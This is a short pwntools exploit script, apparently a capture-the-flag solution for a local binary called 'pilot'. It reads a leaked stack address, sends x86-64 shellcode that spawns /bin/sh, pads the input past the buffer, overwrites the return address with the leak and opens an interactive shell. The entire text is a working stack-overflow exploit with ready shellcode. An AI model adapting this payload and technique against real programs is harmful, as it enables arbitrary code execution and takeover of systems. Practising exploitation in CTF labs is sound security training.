from pwn import *

r = process("./pilot")

r.recvuntil("[*]Location:0x")
leak = int(r.recvline(), 16)

print hex(leak)


shellcode = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

r.sendline(shellcode + "A" * (32 - len(shellcode)) + "B" * 8 + p64(leak))
r.interactive()